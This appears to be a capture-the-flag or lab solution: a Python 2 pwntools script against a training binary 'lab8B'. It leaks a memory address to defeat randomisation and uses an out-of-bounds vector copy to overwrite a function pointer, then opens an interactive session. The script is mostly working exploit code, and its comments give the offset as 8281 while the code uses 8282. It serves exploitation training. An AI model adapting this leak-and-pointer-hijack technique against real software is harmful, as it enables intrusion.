'''
Bug is where it tries to copy the struct vector in v3 to the heap. It does
&v3's memory address + i where i is index. So if I create more than 1 fav,
I can control the printFunc() --> 7th vector is in my control.
'''

#!/usr/bin/python
from pwn import *

sh1 = process("./lab8B")
print sh1.recv()
raw_input()

# Win address is randomised. We need a leak.
offset = 8281

# Secret = vector2_address - 8281

# Enter data in vector 1.
sh1.send("1\n")
sh1.send("1\n")
sh1.send("A\n")
sh1.send("1\n")
sh1.send("2\n")
sh1.send("3\n")
sh1.send("4\n")
sh1.send("5\n")

buff = "1"
sh1.send(buff)
sh1.send("\n")

sh1.send("7\n")
sh1.send("8\n")
print sh1.recv()

sh1.send("1\n")
sh1.send("2\n")
sh1.send("A\n")
sh1.send("1\n")
sh1.send("2\n")
sh1.send("3\n")
sh1.send("4\n")
sh1.send("5\n")

sh1.send("1\n")
sh1.send("7\n")
sh1.send("8\n")
print sh1.recv()

''' LEAK!!'''
sh1.send("3\n")
sh1.send("2\n")
b = sh1.recvuntil("void printFunc")
b = b.split()
leak = b[10]
leak = int(leak,16)
win = leak-8282

#Re enter data.
sh1.send("1\n")
sh1.send("1\n")
sh1.send("A\n")
sh1.send("1\n")
sh1.send("2\n")
sh1.send("3\n")
sh1.send("4\n")
sh1.send("5\n")

buff = str(win)
sh1.send(buff)
sh1.send("\n")

sh1.send("7\n")
sh1.send("8\n")

sh1.send("2\n")

i = 7
while i>0:
	sh1.send("4\n")
	i = i - 1

# Load favorite into vector 1.
sh1.send("6\n")
sh1.send("6\n")
sh1.send("1\n")

# Trigger vulnerability.
sh1.send("3\n")
sh1.send("1\n")

sh1.interactive()
